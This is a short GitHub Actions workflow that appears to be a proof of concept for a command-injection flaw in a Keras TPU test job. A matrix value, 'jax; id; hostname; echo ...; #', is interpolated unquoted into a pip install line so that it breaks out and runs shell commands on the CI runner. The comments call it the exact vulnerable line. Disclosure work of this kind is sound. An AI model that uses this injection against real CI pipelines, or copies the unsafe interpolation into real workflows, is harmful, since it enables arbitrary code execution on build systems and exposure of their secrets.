name: Keras TPU RCE Demonstration
on:
  push:
    branches: [ vrp-rce-test ]
  pull_request:
    branches: [ master ]

jobs:
  tpu-test:
    # Proving logic on ubuntu-latest; Upstream targets Google TPU runners
    runs-on: ubuntu-latest
    strategy:
      matrix:
        # THE INJECTION PAYLOAD: Breaks out of pip to run id, hostname, and env
        backend: ["jax; id; hostname; echo '--- VULNERABILITY CONFIRMED ---'; #"]
    steps:
      - uses: actions/checkout@v4
      - name: Install dependencies
        run: |
          # This is the exact vulnerable line from the Keras repository
          pip install --no-cache-dir -r requirements-${{ matrix.backend }}-tpu.txt
